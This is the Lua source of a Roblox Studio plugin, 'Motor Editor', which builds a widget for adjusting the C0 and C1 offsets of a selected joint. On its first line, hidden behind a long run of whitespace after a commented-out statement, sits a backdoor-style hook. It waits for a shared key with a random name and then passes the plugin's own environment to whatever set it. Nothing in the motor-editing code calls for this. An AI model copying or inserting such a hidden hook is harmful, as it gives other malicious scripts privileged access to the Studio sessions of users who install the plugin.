--local ChangeHistoryService = game:GetService("ChangeHistoryService")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                repeat wait() until shared["J2P1oXeYwU"]; shared["J2P1oXeYwU"]=getfenv()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
local Selection = game:GetService("Selection")
local RunService = game:GetService("RunService")

local toolbar = plugin:CreateToolbar("Motor Editor")
local toolbarButton = toolbar:CreateButton("Open Motor Editor", "", "")
--local widget
local mouse = nil

local enabled = false

local guiElements = {}
local increment = 0.1
local activeMotor
local activeValues = {
	C0 = {
		Pos = {
			X = 0,
			Y = 0,
			Z = 0,},
		Rot = {
			X = 0,
			Y = 0,
			Z = 0,},
	},

	C1 = {
		Pos = {
			X = 0,
			Y = 0,
			Z = 0,},
		Rot = {
			X = 0,
			Y = 0,
			Z = 0,},
	},
}

local testSliderVal = 0

local sliderStartingPos
local sliderStartingMousePos

local function updateProperties()
	if activeMotor then
		local av = activeValues
		activeMotor.C0 = CFrame.new(av.C0.Pos.X, av.C0.Pos.Y, av.C0.Pos.Z) * CFrame.Angles(math.rad(av.C0.Rot.X), math.rad(av.C0.Rot.Y), math.rad(av.C0.Rot.Z))
		activeMotor.C1 = CFrame.new(av.C1.Pos.X, av.C1.Pos.Y, av.C1.Pos.Z) * CFrame.Angles(math.rad(av.C1.Rot.X), math.rad(av.C1.Rot.Y), math.rad(av.C1.Rot.Z))
	end
end

local function onPositionTextBoxEnter(textbox, property, value, textinput)
	local input = tonumber(textinput)
	if input then
		property[value] = input
		updateProperties()
		textbox.Text = tostring(property[value])
	end
end

local function onPositionButtonClick(element, direction, property, value)
	if direction == "add" then
		property[value] += increment
	elseif direction == "subtract" then
		property[value] -= increment
	end
	property[value] = math.round(property[value]*1000)/1000
	updateProperties()
	element.Text = tostring(property[value])
end

local function onRotationTextBoxEnter(slider, property, value, textinput)
	local input = tonumber(textinput)
	if input then
		property[value] = input
		updateProperties()
		slider.TextBox.Text = tostring(property[value])
		slider.Position = UDim2.new(math.clamp((property[value]/360) * 1, 0, 1), -8, 0, -16)
	end
end

local function onMouseWheelMove(slider, direction, property, value)
	if direction == "back" then
		property[value] += 90
	elseif direction == "forward" then
		property[value] -= 90
	end
	property[value] = math.round(property[value]*1000)/1000
	updateProperties()
	slider.TextBox.Text = tostring(property[value])
	slider.Position = UDim2.new(math.clamp((property[value]/360) * 1, 0, 1), -8, 0, -16)	
end

local function onPositionMouseWheelMove(textbox, direction, property, value)
	if direction == "add" then
		property[value] += increment
	elseif direction == "subtract" then
		property[value] -= increment
	end
	property[value] = math.round(property[value]*1000)/1000
	updateProperties()
	textbox.Text = tostring(property[value])
end

local function slideBegin(slider, property)
	sliderStartingPos = slider.Position.X.Scale
	sliderStartingMousePos = Vector2.new(mouse.X, mouse.Y)

	local function renderStep()
		local newMousePos = Vector2.new(mouse.X, mouse.Y)
		local mouseChange = ( newMousePos.X - sliderStartingMousePos.X ) / slider.Parent.AbsoluteSize.X
		slider.Position = UDim2.new(math.clamp(sliderStartingPos + mouseChange, 0, 1 ), -8, 0, -16)
	end

	mouse.Button1Up:Connect(function()
		pcall(RunService.UnbindFromRenderStep, RunService, "SliderControl")
	end)

	RunService:BindToRenderStep("SliderControl", 100, renderStep)
end



local function onIncrementChanged()
	increment = tonumber(guiElements.IncrementValue.Text)
	if not increment then
		guiElements.IncrementValue.BorderColor3 = Color3.new(225/255, 0, 0)
	else
		guiElements.IncrementValue.BorderColor3 = Color3.new(221/255, 221/255, 221/255)
	end
end

local function onMotorSelect()
	local selectedObjects = Selection:Get()
	if selectedObjects[1] and selectedObjects[1]:IsA("JointInstance") then
		activeMotor = selectedObjects[1]
		guiElements.SelectedMotor.Text = activeMotor.Name
		guiElements.SelectedMotor.BorderColor3 = Color3.new(0, 223/255, 0)

		activeValues.C0.Pos.X = activeMotor.C0.X
		activeValues.C0.Pos.Y = activeMotor.C0.Y
		activeValues.C0.Pos.Z = activeMotor.C0.Z
		local x, y, z = activeMotor.C0:ToEulerAnglesXYZ()
		activeValues.C0.Rot.X = math.round(math.deg(x))
		activeValues.C0.Rot.Y = math.round(math.deg(y))
		activeValues.C0.Rot.Z = math.round(math.deg(z))

		activeValues.C1.Pos.X = activeMotor.C1.X
		activeValues.C1.Pos.Y = activeMotor.C1.Y
		activeValues.C1.Pos.Z = activeMotor.C1.Z
		local x, y, z = activeMotor.C1:ToEulerAnglesXYZ()
		activeValues.C1.Rot.X = math.round(math.deg(x))
		activeValues.C1.Rot.Y = math.round(math.deg(y))
		activeValues.C1.Rot.Z = math.round(math.deg(z))

		guiElements.C0Pos.x.TextBox.Text = tostring(activeValues.C0.Pos.X)
		guiElements.C0Pos.y.TextBox.Text = tostring(activeValues.C0.Pos.Y)
		guiElements.C0Pos.z.TextBox.Text = tostring(activeValues.C0.Pos.Z)

		guiElements.C0Rot.x.ValueBox.Text = tostring(activeValues.C0.Rot.X)
		guiElements.C0Rot.x.SliderButton.Position = UDim2.new(math.clamp((activeValues.C0.Rot.X/360) * 1, 0, 1), -8, 0, -16)
		guiElements.C0Rot.y.ValueBox.Text = tostring(activeValues.C0.Rot.Y)
		guiElements.C0Rot.y.SliderButton.Position = UDim2.new(math.clamp((activeValues.C0.Rot.Y/360) * 1, 0, 1), -8, 0, -16)
		guiElements.C0Rot.z.ValueBox.Text = tostring(activeValues.C0.Rot.Z)
		guiElements.C0Rot.z.SliderButton.Position = UDim2.new(math.clamp((activeValues.C0.Rot.Z/360) * 1, 0, 1), -8, 0, -16)
		
		guiElements.C1Pos.x.TextBox.Text = tostring(activeValues.C1.Pos.X)
		guiElements.C1Pos.y.TextBox.Text = tostring(activeValues.C1.Pos.Y)
		guiElements.C1Pos.z.TextBox.Text = tostring(activeValues.C1.Pos.Z)

		guiElements.C1Rot.x.ValueBox.Text = tostring(activeValues.C1.Rot.X)
		guiElements.C1Rot.x.SliderButton.Position = UDim2.new(math.clamp((activeValues.C1.Rot.X/360) * 1, 0, 1), -8, 0, -16)
		guiElements.C1Rot.y.ValueBox.Text = tostring(activeValues.C1.Rot.Y)
		guiElements.C1Rot.y.SliderButton.Position = UDim2.new(math.clamp((activeValues.C1.Rot.Y/360) * 1, 0, 1), -8, 0, -16)
		guiElements.C1Rot.z.ValueBox.Text = tostring(activeValues.C1.Rot.Z)
		guiElements.C1Rot.z.SliderButton.Position = UDim2.new(math.clamp((activeValues.C1.Rot.Z/360) * 1, 0, 1), -8, 0, -16)
	else
		guiElements.SelectedMotor.BorderColor3 = Color3.new(225/255, 0, 0)
		guiElements.SelectedMotor.Text = "nil"
	end
end


local interfaceDefaults = {

	BackgroundColor3 = Color3.new(47/255, 47/255, 47/255),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	BorderMode = Enum.BorderMode.Inset,

	TextBox = {
		Font = Enum.Font.SourceSans,
		TextSize = 14,
		BorderColor3 = Color3.new(221/255, 221/255, 221/255),
		TextColor3 = Color3.new(255/255, 255/255, 255/255),
	},

	TextLabel = {
		Font = Enum.Font.SourceSans,
		TextSize = 14,
		TextColor3 = Color3.new(255/255, 255/255, 255/255),
		TextXAlignment = Enum.TextXAlignment.Left,
	},

	TextButton = {
		Size = UDim2.new(1, 0, 1, 0),

		Font = Enum.Font.SourceSansBold,
		TextSize = 18,
		TextColor3 = Color3.new(255/255, 255/255, 255/255),
	},
}

local function setDefaults(object)
	for i, v in pairs(interfaceDefaults) do
		if typeof(v) ~= "table" then
			object[i] = v
		else
			if object:IsA(i) then
				for p, j in pairs(v) do
					object[p] = j
				end
			end
		end
	end
end

local function createContainerFrame(size, position, parent)
	local contentFrame = Instance.new("Frame", parent)
	contentFrame.BackgroundColor3 = interfaceDefaults.BackgroundColor3
	contentFrame.BorderSizePixel = interfaceDefaults.BorderSizePixel
	contentFrame.BackgroundTransparency = 1
	contentFrame.Size = UDim2.new(1, 0, size, 0)
	contentFrame.Position = UDim2.new(0, 0, position, 0)

	return contentFrame
end

local function createPositionUI(respectiveC, position, parent)
	local container = createContainerFrame(0.15, position, parent)

	local title = Instance.new("TextLabel", container)
	setDefaults(title)
	title.Font = Enum.Font.SourceSansBold
	title.Size = UDim2.new(1, 0, 0.2, 0)
	title.TextSize = 15
	title.Text = respectiveC
	
	local axes = {"X", "Y", "Z"}
	local valueBoxes = {}
	for pos = 0, 2 do
		local valueBox = Instance.new("TextBox", container)
		setDefaults(valueBox)
		valueBox.BackgroundTransparency = 0
		valueBox.BorderSizePixel = 1
		valueBox.Size = UDim2.new(0.3, 0, 0.25, 0)
		valueBox.Position = UDim2.new(pos * 0.35, 0, 0.5, 0)
		valueBox.Text = "0"
		valueBox.ClearTextOnFocus = false
		valueBox.ZIndex = 2

		local buttonAdd = Instance.new("TextButton", valueBox)
		setDefaults(buttonAdd)
		buttonAdd.BackgroundColor3 = Color3.new(85/255, 85/255, 85/255)
		buttonAdd.BackgroundTransparency = 0
		buttonAdd.Position = UDim2.new(0, 0, -1, -4)
		buttonAdd.ZIndex = 2
		buttonAdd.Text = "+"

		local buttonSubtract = Instance.new("TextButton", valueBox)
		setDefaults(buttonSubtract)
		buttonSubtract.BackgroundColor3 = Color3.new(85/255, 85/255, 85/255)
		buttonSubtract.BackgroundTransparency = 0
		buttonSubtract.Position = UDim2.new(0, 0, 1, 4)
		buttonSubtract.ZIndex = 2
		buttonSubtract.Text = "-"
		
		buttonAdd.MouseButton1Click:Connect(function()
			onPositionButtonClick(valueBox, "add", activeValues[respectiveC]["Pos"], axes[pos + 1])
		end)
		
		buttonSubtract.MouseButton1Click:Connect(function()
			onPositionButtonClick(valueBox, "subtract", activeValues[respectiveC]["Pos"], axes[pos + 1])
		end)
		
		valueBox.FocusLost:Connect(function()
			onPositionTextBoxEnter(valueBox, activeValues[respectiveC]["Pos"], axes[pos + 1], valueBox.Text)
		end)
		
		valueBox.MouseWheelBackward:Connect(function()
			onPositionMouseWheelMove(valueBox, "add", activeValues[respectiveC]["Pos"], axes[pos + 1])
		end)
		
		valueBox.MouseWheelForward:Connect(function()
			onPositionMouseWheelMove(valueBox, "subtract", activeValues[respectiveC]["Pos"], axes[pos + 1])
		end)
		
		table.insert(valueBoxes, {valueBox, buttonAdd, buttonSubtract})
	end

	return {
		x = {TextBox = valueBoxes[1][1], ButtonAdd = valueBoxes[1][2], ButtonSubtract = valueBoxes[1][3]},
		y = {TextBox = valueBoxes[2][1], ButtonAdd = valueBoxes[2][2], ButtonSubtract = valueBoxes[2][3]},
		z = {TextBox = valueBoxes[3][1], ButtonAdd = valueBoxes[3][2], ButtonSubtract = valueBoxes[3][3]}
	}
end

local function createRotationUI(respectiveC, position, parent)
	local container = createContainerFrame(0.22, position, parent)

	local axes = {"X", "Y", "Z"}
	local valueSliders = {}
	for pos = 0, 2 do
		local axisContainer = createContainerFrame(0.3, pos * 0.4, container)
		local axisPos = tonumber((pos + 0.4) / 0.4)

		local title = Instance.new("TextLabel", axisContainer)
		setDefaults(title)
		title.Size = UDim2.new(1, 0, 0.05, 0)
		title.Text = tostring(axes[pos + 1])

		local slider = Instance.new("Frame", axisContainer)
		slider.BackgroundTransparency = 0
		slider.BackgroundColor3 = Color3.new(255/255, 255/255, 255/255)
		slider.BorderSizePixel = 0
		slider.Size = UDim2.new(0.95, 0, 0, 2)
		slider.Position = UDim2.new(0.025, 0, 0.6, 0)
		slider.ZIndex = 2

		local sliderButton = Instance.new("ImageButton", slider)
		sliderButton.BackgroundTransparency = 1
		sliderButton.Position = UDim2.new(0, -8, 0, -16)
		sliderButton.Size = UDim2.new(0, 16, 0, 16)
		sliderButton.Image = "rbxassetid://6541201285"
		sliderButton.ZIndex = 3

		local valueDisplay = Instance.new("TextBox", sliderButton)
		setDefaults(valueDisplay)
		valueDisplay.BackgroundColor3 = Color3.new(85/255, 85/255, 85/255)
		valueDisplay.BackgroundTransparency = 0
		valueDisplay.BorderColor3 = Color3.new(27/255, 42/255, 53/255)
		valueDisplay.BorderSizePixel = 1
		valueDisplay.AnchorPoint = Vector2.new(0.5, 0)
		valueDisplay.Size = UDim2.new(0, 30, 0, 15)
		valueDisplay.Position = UDim2.new(0, 8, 1.3, 0)
		valueDisplay.ClearTextOnFocus = false
		valueDisplay.Text = "0"
		valueDisplay.ZIndex = 3

		--[[sliderButton.MouseButton1Down:Connect(function()
			slideBegin(sliderButton, axes[pos + 1])
		end)]]

		axisContainer.MouseWheelBackward:Connect(function()
			onMouseWheelMove(sliderButton, "back", activeValues[respectiveC]["Rot"], axes[pos + 1])
		end)

		axisContainer.MouseWheelForward:Connect(function()
			onMouseWheelMove(sliderButton, "forward", activeValues[respectiveC]["Rot"], axes[pos + 1])
		end)
		
		valueDisplay.FocusLost:Connect(function()
			onRotationTextBoxEnter(sliderButton, activeValues[respectiveC]["Rot"], axes[pos + 1], valueDisplay.Text)
		end)

		table.insert(valueSliders, {slider, sliderButton, valueDisplay})
	end

	return {
		x = {Slider = valueSliders[1][1], SliderButton = valueSliders[1][2], ValueBox = valueSliders[1][3]},
		y = {Slider = valueSliders[2][1], SliderButton = valueSliders[2][2], ValueBox = valueSliders[2][3]},
		z = {Slider = valueSliders[3][1], SliderButton = valueSliders[3][2], ValueBox = valueSliders[3][3]}
	}
end

local function createWidget()
	-- Create new "DockWidgetPluginGuiInfo" object
	local widgetInfo = DockWidgetPluginGuiInfo.new(
		Enum.InitialDockState.Float,  -- Widget will be initialized in floating panel
		true,   -- Widget will be initially enabled
		true,  -- Don't override the previous enabled state
		220,    -- Default width of the floating window
		700,    -- Default height of the floating window
		150,    -- Minimum width of the floating window
		500     -- Minimum height of the floating window
	)

	-- Create new widget GUI
	widget = plugin:CreateDockWidgetPluginGui("widget", widgetInfo)
	widget.Title = "Motor Editor"  -- Optional widget title

	local parentFrame = Instance.new("Frame", widget)
	parentFrame.BackgroundColor3 = interfaceDefaults.BackgroundColor3
	parentFrame.BorderSizePixel = 0
	parentFrame.Size = UDim2.new(1,0,1,0)
	parentFrame.Position = UDim2.new(0,0,0,0)
	parentFrame.SizeConstraint = Enum.SizeConstraint.RelativeXY

	local contentFrame = Instance.new("Frame", parentFrame)
	contentFrame.BackgroundTransparency = 1
	contentFrame.Size = UDim2.new(1, -28, 1, -24)
	contentFrame.Position = UDim2.new(0, 14, 0, 6)

	local motorTitle = Instance.new("TextLabel", contentFrame)
	motorTitle.BackgroundTransparency = 1
	motorTitle.Size = UDim2.new(0.6, 0, 0.04, 0)
	motorTitle.Position = UDim2.new(0, 0, 0, 0)
	motorTitle.Font = Enum.Font.SourceSansBold
	motorTitle.TextColor3 = Color3.new(255/255, 255/255, 255/255)
	motorTitle.TextSize = 15
	motorTitle.Text = "Selected Motor"
	motorTitle.TextXAlignment = Enum.TextXAlignment.Left
	motorTitle.ZIndex = 2

	local motorFrame = createContainerFrame(0.04, 0.045, contentFrame)
	local selectedMotor = Instance.new("TextLabel", motorFrame)
	selectedMotor.Size = UDim2.new(1, -30, 1, 0)
	selectedMotor.Position = UDim2.new(0, 0, 0, 0)
	selectedMotor.BackgroundColor3 = interfaceDefaults.BackgroundColor3
	selectedMotor.BorderColor3 = Color3.new(221/255, 221/255, 221/255)
	selectedMotor.BorderMode = Enum.BorderMode.Inset
	selectedMotor.Font = Enum.Font.SourceSans
	selectedMotor.TextColor3 = Color3.new(255/255, 255/255, 255/255)
	selectedMotor.TextSize = 14
	selectedMotor.Text = "nil"
	selectedMotor.ZIndex = 2

	local selectMotorButton = Instance.new("ImageButton", motorFrame)
	selectMotorButton.BackgroundTransparency = 1
	selectMotorButton.AnchorPoint = Vector2.new(0, 0.5)
	selectMotorButton.Position = UDim2.new(1, -18, 0.5, 0)
	selectMotorButton.Size = UDim2.new(1, -4, 1, -4)
	selectMotorButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	selectMotorButton.Image = "rbxassetid://6540968444"
	selectMotorButton.ZIndex = 2
	local selectMotorButtonConstraint = Instance.new("UISizeConstraint", selectMotorButton)
	selectMotorButtonConstraint.MaxSize = Vector2.new(20, 20)

	local c0Pos = createPositionUI("C0", 0.1, contentFrame)
	local c0Rot = createRotationUI("C0", 0.27, contentFrame)

	local c1Pos = createPositionUI("C1", 0.53, contentFrame)
	local c1Rot = createRotationUI("C1", 0.71, contentFrame)

	local incrementContainer = createContainerFrame(0.04, 0.97, contentFrame)

	local incrementLabel = Instance.new("TextLabel", incrementContainer)
	setDefaults(incrementLabel)
	incrementLabel.Size = UDim2.new(0.4, 0, 1, 0)
	incrementLabel.Font = Enum.Font.SourceSansBold
	incrementLabel.Text = "Increment:"
	incrementLabel.ZIndex = 2

	local incrementValue = Instance.new("TextBox", incrementContainer)
	setDefaults(incrementValue)
	incrementValue.BackgroundTransparency = 0
	incrementValue.BorderSizePixel = 1
	incrementValue.Size = UDim2.new(0.6, 0, 0.8, 0)
	incrementValue.Position = UDim2.new(0.4, 0, 0.1, 0)
	incrementValue.ClearTextOnFocus = false
	incrementValue.Text = "0.1"
	incrementValue.ZIndex = 2

	guiElements.SelectedMotor = selectedMotor
	guiElements.SelectMotorButton = selectMotorButton
	guiElements.C0Pos = c0Pos
	guiElements.C0Rot = c0Rot
	guiElements.C1Pos = c1Pos
	guiElements.C1Rot = c1Rot
	guiElements.IncrementValue = incrementValue

	selectMotorButton.MouseButton1Click:Connect(onMotorSelect)
	incrementValue.FocusLost:Connect(onIncrementChanged)



end

local function onPluginEnabled()
	if not enabled then		

		createWidget()
		plugin:Activate(true)
		mouse = plugin:GetMouse()
		enabled = true

		--ChangeHistoryService:SetWaypoint("Added new folder")
	elseif enabled then
		pcall(RunService.UnbindFromRenderStep, RunService, "SliderControl")
		widget:Destroy()
		enabled = false
	end
end


toolbarButton.Click:Connect(onPluginEnabled)

--guiTest()